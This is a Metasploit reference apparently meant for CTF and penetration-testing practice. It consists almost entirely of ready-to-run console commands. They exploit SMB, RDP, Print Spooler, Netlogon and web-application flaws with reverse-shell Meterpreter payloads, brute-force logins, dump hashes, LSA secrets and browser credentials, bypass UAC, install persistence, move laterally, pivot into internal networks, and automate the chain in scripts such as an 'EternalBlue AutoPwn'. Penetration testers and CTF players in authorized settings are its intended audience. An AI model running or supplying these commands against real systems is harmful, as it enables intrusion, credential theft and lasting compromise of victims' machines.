# Metasploit Modules Reference

Comprehensive documentation of commonly used Metasploit modules for CTFs and penetration testing.

## Table of Contents

- [Module Types Overview](#module-types-overview)
- [Exploit Modules](#exploit-modules)
  - [Windows SMB Exploits](#windows-smb-exploits)
  - [Windows RDP/RPC Exploits](#windows-rdprpc-exploits)
  - [Web Application Exploits](#web-application-exploits)
  - [Active Directory Exploits](#active-directory-exploits)
- [Auxiliary Modules](#auxiliary-modules)
  - [Network Scanners](#network-scanners)
  - [Service Enumeration](#service-enumeration)
  - [Credential Gathering](#credential-gathering)
- [Post-Exploitation Modules](#post-exploitation-modules)
  - [Credential Harvesting](#credential-harvesting)
  - [Privilege Escalation](#privilege-escalation)
  - [Persistence](#persistence)
  - [Lateral Movement](#lateral-movement)
- [Payloads](#payloads)
  - [Staged vs Stageless](#staged-vs-stageless)
  - [Meterpreter Variants](#meterpreter-variants)
  - [Shell Payloads](#shell-payloads)
- [Practical Examples](#practical-examples)
  - [Common Windows Exploits Workflow](#common-windows-exploits-workflow)
  - [Database Integration](#database-integration)
  - [Session Management](#session-management)
  - [Pivoting Through Sessions](#pivoting-through-sessions)
  - [Resource Scripts for Automation](#resource-scripts-for-automation)

---

## Module Types Overview

| Type | Path | Purpose |
|------|------|---------|
| **Exploits** | `exploit/` | Leverage vulnerabilities to gain access |
| **Auxiliary** | `auxiliary/` | Scanning, fuzzing, sniffing, no payload delivery |
| **Post** | `post/` | Actions after session established |
| **Payloads** | `payload/` | Code executed on target after exploitation |
| **Encoders** | `encoder/` | Obfuscate payloads to evade detection |
| **Evasion** | `evasion/` | Generate AV-evading executables |
| **Nops** | `nop/` | NOP sled generators for buffer overflows |

---

## Exploit Modules

### Windows SMB Exploits

#### EternalBlue (MS17-010)

One of the most reliable Windows exploits, affecting SMBv1 on Windows XP through Windows Server 2008 R2.

```bash
# Module path
use exploit/windows/smb/ms17_010_eternalblue

# Required options
set RHOSTS 10.10.10.40
set LHOST 10.10.14.5
set PAYLOAD windows/x64/meterpreter/reverse_tcp

# Check if vulnerable before exploiting
check

# Execute
run
```

**Affected Systems**: Windows XP, Vista, 7, 8, Server 2003/2008/2008R2 (unpatched)

**CVE**: CVE-2017-0144

#### EternalRomance/EternalSynergy (MS17-010 PSExec)

Alternative MS17-010 exploit with named pipe execution.

```bash
use exploit/windows/smb/ms17_010_psexec

set RHOSTS 10.10.10.40
set SMBUser administrator
set SMBPass aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST 10.10.14.5

run
```

**Note**: Supports pass-the-hash authentication.

#### SMB Relay Attack

```bash
use exploit/windows/smb/smb_relay

set SMBHOST 10.10.10.50    # Target to relay to
set LHOST 10.10.14.5
set PAYLOAD windows/meterpreter/reverse_tcp

run
```

#### PSExec (Authenticated RCE)

Execute commands with valid credentials via SMB.

```bash
use exploit/windows/smb/psexec

set RHOSTS 10.10.10.40
set SMBDomain CORP
set SMBUser admin
set SMBPass Password123!
# Or use hash
set SMBPass aad3b435b51404eeaad3b435b51404ee:8846f7eaee8fb117ad06bdd830b7586c
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST 10.10.14.5

run
```

### Windows RDP/RPC Exploits

#### BlueKeep (CVE-2019-0708)

Remote Desktop Services RCE affecting Windows 7 and Server 2008 R2.

```bash
use exploit/windows/rdp/cve_2019_0708_bluekeep_rce

set RHOSTS 10.10.10.40
set RDPPORT 3389
set TARGET 2    # Windows 7 SP1
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST 10.10.14.5

run
```

**Targets**:
- 1: Windows 7 SP1 / 2008 R2 (6.1.7601 x64) - Virtualbox
- 2: Windows 7 SP1 / 2008 R2 (6.1.7601 x64) - VMware
- 3: Windows 7 SP1 / 2008 R2 (6.1.7601 x64) - Hyper-V

#### PrintNightmare (CVE-2021-1675 / CVE-2021-34527)

Windows Print Spooler RCE.

```bash
use exploit/windows/dcerpc/cve_2021_1675_printnightmare

set RHOSTS 10.10.10.40
set SMBUser lowpriv_user
set SMBPass Password123!
set SRVHOST 10.10.14.5    # For hosting malicious DLL
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST 10.10.14.5

run
```

**Note**: Requires valid domain credentials (even low-privilege).

#### ZeroLogon (CVE-2020-1472)

Netlogon vulnerability to reset DC machine account password.

```bash
use auxiliary/admin/dcerpc/cve_2020_1472_zerologon

set RHOSTS 10.10.10.40
set NBNAME DC01

run
```

**Warning**: This can break the DC. Use for CTFs only or with explicit authorization.

### Web Application Exploits

#### Tomcat Manager Upload

```bash
use exploit/multi/http/tomcat_mgr_upload

set RHOSTS 10.10.10.95
set RPORT 8080
set HttpUsername tomcat
set HttpPassword s3cret
set PAYLOAD java/meterpreter/reverse_tcp
set LHOST 10.10.14.5

run
```

#### Apache Struts (CVE-2017-5638)

```bash
use exploit/multi/http/struts2_content_type_ognl

set RHOSTS 10.10.10.150
set RPORT 8080
set TARGETURI /showcase.action
set PAYLOAD linux/x64/meterpreter/reverse_tcp
set LHOST 10.10.14.5

run
```

#### Jenkins Script Console

```bash
use exploit/multi/http/jenkins_script_console

set RHOSTS 10.10.10.63
set RPORT 8080
set USERNAME admin
set PASSWORD admin
set TARGETURI /
set PAYLOAD linux/x64/meterpreter/reverse_tcp
set LHOST 10.10.14.5

run
```

#### WordPress Admin Shell Upload

```bash
use exploit/unix/webapp/wp_admin_shell_upload

set RHOSTS 10.10.10.88
set USERNAME admin
set PASSWORD password123
set TARGETURI /wordpress/
set PAYLOAD php/meterpreter/reverse_tcp
set LHOST 10.10.14.5

run
```

### Active Directory Exploits

#### Kerberoasting

```bash
use auxiliary/gather/kerberoast

set RHOSTS 10.10.10.100
set DOMAIN corp.local
set USER lowpriv
set PASS Password123!

run
```

#### AS-REP Roasting

```bash
use auxiliary/gather/asrep

set RHOSTS 10.10.10.100
set DOMAIN corp.local
set USER_FILE /usr/share/wordlists/users.txt

run
```

#### AD CS ESC1 Exploitation

```bash
use auxiliary/admin/dcerpc/icpr_cert

set CA DC01.corp.local\\corp-DC01-CA
set CERT_TEMPLATE VulnerableTemplate
set ALT_UPN administrator@corp.local
set RHOSTS 10.10.10.100
set SMBUser lowpriv
set SMBPass Password123!

run
```

---

## Auxiliary Modules

### Network Scanners

#### SMB Version Scanner

```bash
use auxiliary/scanner/smb/smb_version

set RHOSTS 10.10.10.0/24
set THREADS 20

run
```

Output reveals OS version, SMB dialect, and signing status.

#### HTTP Version/Title Scanner

```bash
use auxiliary/scanner/http/http_version

set RHOSTS 10.10.10.0/24
set RPORT 80
set THREADS 20

run
```

#### Port Scanner

```bash
use auxiliary/scanner/portscan/tcp

set RHOSTS 10.10.10.40
set PORTS 1-1000
set THREADS 50

run
```

#### SSH Version Scanner

```bash
use auxiliary/scanner/ssh/ssh_version

set RHOSTS 10.10.10.0/24
set THREADS 20

run
```

### Service Enumeration

#### SMB Share Enumeration

```bash
use auxiliary/scanner/smb/smb_enumshares

set RHOSTS 10.10.10.40
set SMBUser guest
set SMBPass ""
set ShowFiles true

run
```

#### SMB User Enumeration (RID Cycling)

```bash
use auxiliary/scanner/smb/smb_lookupsid

set RHOSTS 10.10.10.40
set SMBUser ""
set SMBPass ""
set MaxRID 2000

run
```

#### SNMP Enumeration

```bash
use auxiliary/scanner/snmp/snmp_enum

set RHOSTS 10.10.10.40
set COMMUNITY public

run
```

#### LDAP Enumeration

```bash
use auxiliary/gather/ldap_query

set RHOSTS 10.10.10.100
set BASE_DN dc=corp,dc=local
set USERNAME lowpriv@corp.local
set PASSWORD Password123!

run
```

#### NFS Share Enumeration

```bash
use auxiliary/scanner/nfs/nfsmount

set RHOSTS 10.10.10.40

run
```

### Credential Gathering

#### SMB Login Brute Force

```bash
use auxiliary/scanner/smb/smb_login

set RHOSTS 10.10.10.40
set SMBDomain CORP
set USER_FILE /usr/share/wordlists/users.txt
set PASS_FILE /usr/share/wordlists/passwords.txt
set VERBOSE false
set STOP_ON_SUCCESS true

run
```

#### SSH Login Brute Force

```bash
use auxiliary/scanner/ssh/ssh_login

set RHOSTS 10.10.10.40
set USERNAME root
set PASS_FILE /usr/share/wordlists/rockyou.txt
set THREADS 5
set VERBOSE false

run
```

#### MySQL Login

```bash
use auxiliary/scanner/mysql/mysql_login

set RHOSTS 10.10.10.40
set USERNAME root
set PASS_FILE /usr/share/wordlists/passwords.txt

run
```

#### FTP Login

```bash
use auxiliary/scanner/ftp/ftp_login

set RHOSTS 10.10.10.40
set USERNAME anonymous
set PASSWORD anonymous@

run
```

#### WinRM Login

```bash
use auxiliary/scanner/winrm/winrm_login

set RHOSTS 10.10.10.40
set USERNAME administrator
set PASSWORD Password123!
set DOMAIN CORP

run
```

---

## Post-Exploitation Modules

### Credential Harvesting

#### Windows Hash Dump (SAM)

```bash
# From meterpreter session
run post/windows/gather/hashdump

# Or manually
use post/windows/gather/hashdump
set SESSION 1
run
```

#### Domain Cached Credentials

```bash
use post/windows/gather/cachedump
set SESSION 1
run
```

#### LSA Secrets

```bash
use post/windows/gather/lsa_secrets
set SESSION 1
run
```

#### Kerberos Tickets

```bash
use post/windows/gather/kerberos_keytab
set SESSION 1
run
```

#### Browser Credentials

```bash
# Chrome
use post/multi/gather/chrome_cookies
set SESSION 1
run

# Firefox
use post/multi/gather/firefox_creds
set SESSION 1
run
```

#### Mimikatz via Kiwi Extension

```bash
# Load kiwi in meterpreter session
meterpreter> load kiwi
meterpreter> creds_all
meterpreter> kerberos_ticket_list
meterpreter> lsa_dump_sam
meterpreter> lsa_dump_secrets
```

### Privilege Escalation

#### Local Exploit Suggester

Essential for finding privilege escalation paths.

```bash
use post/multi/recon/local_exploit_suggester
set SESSION 1
set SHOWDESCRIPTION true
run
```

#### Windows UAC Bypass

```bash
use exploit/windows/local/bypassuac_fodhelper
set SESSION 1
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST 10.10.14.5
run
```

#### Token Impersonation (Potato attacks)

```bash
# PrintSpoofer/JuicyPotato alternative
use exploit/windows/local/ms16_075_reflection_juicy
set SESSION 1
run

# RottenPotato
use exploit/windows/local/ms16_075_reflection
set SESSION 1
run
```

#### Linux Sudo Exploitation

```bash
use exploit/linux/local/sudo_baron_samedit
set SESSION 1
set PAYLOAD linux/x64/meterpreter/reverse_tcp
set LHOST 10.10.14.5
run
```

### Persistence

#### Windows Persistence

```bash
# Registry run key
use exploit/windows/local/persistence
set SESSION 1
set STARTUP SYSTEM
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST 10.10.14.5
run

# Scheduled task
use exploit/windows/local/persistence_service
set SESSION 1
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST 10.10.14.5
run
```

#### Linux Persistence

```bash
# SSH key
use post/linux/manage/sshkey_persistence
set SESSION 1
set PUBKEY /root/.ssh/id_rsa.pub
run

# Cron job
use exploit/linux/local/cron_persistence
set SESSION 1
run
```

### Lateral Movement

#### PsExec via Session

```bash
use exploit/windows/smb/psexec
set RHOSTS 10.10.10.50
set SMBUser administrator
set SMBPass hash_or_password
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST 10.10.14.5

# Route through existing session
route add 10.10.10.0/24 1

run
```

#### WMI Execution

```bash
use exploit/windows/local/wmi
set SESSION 1
set RHOSTS 10.10.10.50
set SMBUser administrator
set SMBPass Password123!
run
```

---

## Payloads

### Staged vs Stageless

**Staged Payloads** (smaller, two-part):
- Initial stager connects back and downloads main payload
- Uses `/` in name: `windows/meterpreter/reverse_tcp`
- Smaller initial size, evades size-based detection
- Requires stable connection for stage download

**Stageless Payloads** (larger, single):
- Complete payload in one package
- Uses `_` in name: `windows/meterpreter_reverse_tcp`
- Larger size but more reliable
- Works better through unstable connections

```bash
# Staged (two-part)
set PAYLOAD windows/x64/meterpreter/reverse_tcp

# Stageless (single)
set PAYLOAD windows/x64/meterpreter_reverse_tcp
```

### Meterpreter Variants

| Payload | Use Case |
|---------|----------|
| `windows/x64/meterpreter/reverse_tcp` | Default Windows 64-bit |
| `windows/meterpreter/reverse_tcp` | Windows 32-bit |
| `windows/x64/meterpreter/reverse_https` | Encrypted, egress-friendly |
| `linux/x64/meterpreter/reverse_tcp` | Linux 64-bit |
| `linux/x86/meterpreter/reverse_tcp` | Linux 32-bit |
| `java/meterpreter/reverse_tcp` | Cross-platform Java apps |
| `php/meterpreter/reverse_tcp` | PHP web shells |
| `python/meterpreter/reverse_tcp` | Python environments |

#### HTTPS Meterpreter

```bash
set PAYLOAD windows/x64/meterpreter/reverse_https
set LHOST 10.10.14.5
set LPORT 443
set HandlerSSLCert /path/to/cert.pem   # Optional custom cert
set StagerVerifySSLCert true           # Optional verification
```

### Shell Payloads

For when Meterpreter is detected or unstable:

```bash
# Windows command shell
set PAYLOAD windows/x64/shell_reverse_tcp

# Windows PowerShell
set PAYLOAD windows/x64/powershell_reverse_tcp

# Linux shell
set PAYLOAD linux/x64/shell_reverse_tcp

# Generic command execution
set PAYLOAD cmd/unix/reverse_bash
set PAYLOAD cmd/windows/powershell_reverse_tcp
```

---

## Practical Examples

### Common Windows Exploits Workflow

```bash
# 1. Start with database
msfdb init
msfconsole

# 2. Workspace setup
workspace -a target_corp
setg RHOSTS 10.10.10.0/24
setg LHOST 10.10.14.5

# 3. Discovery with db_nmap
db_nmap -sV -sC -p- 10.10.10.40 -oA nmap_full

# 4. View results
hosts
services
services -p 445

# 5. Check for EternalBlue
use auxiliary/scanner/smb/smb_ms17_010
set RHOSTS 10.10.10.40
run

# 6. Exploit if vulnerable
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS 10.10.10.40
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST 10.10.14.5
run

# 7. Post-exploitation
sessions -i 1
getuid
getsystem
hashdump
```

### Database Integration

#### Initial Setup

```bash
# Initialize database
msfdb init

# Check database status
msf6> db_status

# If not connected
msf6> db_connect msf:msf@localhost/msf
```

#### Workspace Management

```bash
# Create workspace
workspace -a pentest_client

# List workspaces
workspace

# Switch workspace
workspace pentest_client

# Delete workspace
workspace -d old_project
```

#### Importing and Exporting

```bash
# Import nmap results
db_import /path/to/nmap.xml

# Import Nessus scan
db_import /path/to/nessus.nessus

# Export data
db_export -f xml /path/to/export.xml
```

#### Querying Data

```bash
# View discovered hosts
hosts
hosts -c address,os_name,purpose

# View services
services
services -p 445,3389
services -S http

# View collected credentials
creds
creds -t ntlm

# View vulnerabilities
vulns
vulns -p 445

# View collected loot
loot
```

### Session Management

#### Basic Session Commands

```bash
# List all sessions
sessions

# Interact with session
sessions -i 1

# Background current session
background
# or Ctrl+Z

# Kill session
sessions -k 1

# Kill all sessions
sessions -K

# Upgrade shell to meterpreter
sessions -u 1
```

#### Session Scripting

```bash
# Run command on all sessions
sessions -C "sysinfo"

# Run post module on session
sessions -i 1 -c "run post/windows/gather/hashdump"
```

#### Multi/Handler Setup

```bash
use exploit/multi/handler
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST 0.0.0.0
set LPORT 4444
set ExitOnSession false    # Keep listening after connection

# Run as background job
run -j

# View jobs
jobs

# Kill job
jobs -k 0
```

### Pivoting Through Sessions

#### Route-Based Pivoting

```bash
# After getting session on dual-homed host
# View session routes
meterpreter> ipconfig

# Add route through session (from msfconsole)
route add 172.16.1.0/24 1    # Route subnet through session 1

# View routes
route print

# Now use modules against internal network
use auxiliary/scanner/portscan/tcp
set RHOSTS 172.16.1.0/24
set PORTS 22,80,443,445,3389
run
```

#### Autoroute Post Module

```bash
use post/multi/manage/autoroute
set SESSION 1
set SUBNET 172.16.1.0
set NETMASK /24
run
```

#### SOCKS Proxy Pivoting

```bash
# Create SOCKS proxy through session
use auxiliary/server/socks_proxy
set SRVHOST 127.0.0.1
set SRVPORT 1080
set VERSION 5
run -j

# Configure proxychains (/etc/proxychains4.conf)
# socks5 127.0.0.1 1080

# Use external tools through proxy
proxychains nmap -sT -Pn 172.16.1.10
proxychains curl http://172.16.1.10
```

#### Port Forwarding

```bash
# From meterpreter session

# Local port forward (access remote service locally)
portfwd add -l 3389 -p 3389 -r 172.16.1.10
# Now connect: rdesktop 127.0.0.1:3389

# Remote port forward (expose local service to target network)
portfwd add -R -l 8080 -p 80 -L 10.10.14.5

# List port forwards
portfwd list

# Delete port forward
portfwd delete -l 3389
portfwd flush
```

### Resource Scripts for Automation

Resource scripts automate repetitive tasks. Save as `.rc` files.

#### Basic Handler Script (handler.rc)

```
use exploit/multi/handler
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST 0.0.0.0
set LPORT 4444
set ExitOnSession false
set AutoRunScript post/windows/manage/migrate
run -j
```

Usage:
```bash
msfconsole -r handler.rc
# Or from within msfconsole
resource handler.rc
```

#### Network Discovery Script (discovery.rc)

```
# Set global target
setg RHOSTS <target_range>
setg THREADS 20

# SMB scanning
use auxiliary/scanner/smb/smb_version
run

# HTTP scanning
use auxiliary/scanner/http/http_version
set RPORT 80
run

use auxiliary/scanner/http/http_version
set RPORT 443
run

# SSH scanning
use auxiliary/scanner/ssh/ssh_version
run
```

#### EternalBlue AutoPwn Script (eternalblue.rc)

```
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS <target>
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST <your_ip>
set LPORT 4444
set AutoRunScript post/windows/gather/hashdump
run
```

#### Post-Exploitation Automation Script (post_auto.rc)

```
# Run after getting session
# Usage: sessions -i 1 -c "resource post_auto.rc"

sysinfo
getuid
getsystem
run post/windows/gather/hashdump
run post/windows/gather/cachedump
run post/multi/recon/local_exploit_suggester
run post/windows/gather/enum_logged_on_users
run post/windows/gather/enum_shares
```

#### Full Engagement Script (engage.rc)

```
# Full engagement automation
<ruby>
  framework.db.workspace = framework.db.add_workspace('engagement')

  target = '10.10.10.0/24'

  print_good("Starting engagement against #{target}")

  # Port scan
  run_single("db_nmap -sV -sC -p 21,22,23,25,80,443,445,3389 #{target}")

  # Check for EternalBlue
  run_single("use auxiliary/scanner/smb/smb_ms17_010")
  run_single("set RHOSTS #{target}")
  run_single("run")
</ruby>
```

#### Running Resource Scripts

```bash
# From command line
msfconsole -r script.rc

# From within msfconsole
msf6> resource /path/to/script.rc

# With variables
msfconsole -r script.rc RHOSTS=10.10.10.40 LHOST=10.10.14.5
```

---

## Quick Reference

### Most Used Modules for CTFs

| Scenario | Module |
|----------|--------|
| Windows SMB RCE | `exploit/windows/smb/ms17_010_eternalblue` |
| Windows with creds | `exploit/windows/smb/psexec` |
| Tomcat default creds | `exploit/multi/http/tomcat_mgr_upload` |
| Jenkins RCE | `exploit/multi/http/jenkins_script_console` |
| WordPress RCE | `exploit/unix/webapp/wp_admin_shell_upload` |
| Find local privesc | `post/multi/recon/local_exploit_suggester` |
| Dump hashes | `post/windows/gather/hashdump` |
| SMB enumeration | `auxiliary/scanner/smb/smb_enumshares` |

### Search Syntax

```bash
# Search by CVE
search cve:2021-1675

# Search by type and platform
search type:exploit platform:windows smb

# Search by name
search name:eternalblue

# Search by author
search author:rapid7

# Search by date
search date:2021

# Combine filters
search type:exploit platform:linux priv
```

### Common Meterpreter Commands

```bash
# System info
sysinfo
getuid
getpid
ps

# Privilege escalation
getsystem
steal_token <pid>

# File operations
upload /local/file.exe C:\\Windows\\Temp\\file.exe
download C:\\Windows\\System32\\config\\SAM /tmp/SAM
cat C:\\flag.txt

# Network
ipconfig
netstat
arp

# Process
migrate <pid>
execute -f cmd.exe -i -H

# Pivoting
portfwd add -l 3389 -p 3389 -r 172.16.1.10
run autoroute -s 172.16.1.0/24

# Load extensions
load kiwi        # Mimikatz
load powershell  # PowerShell
load python      # Python interpreter
```
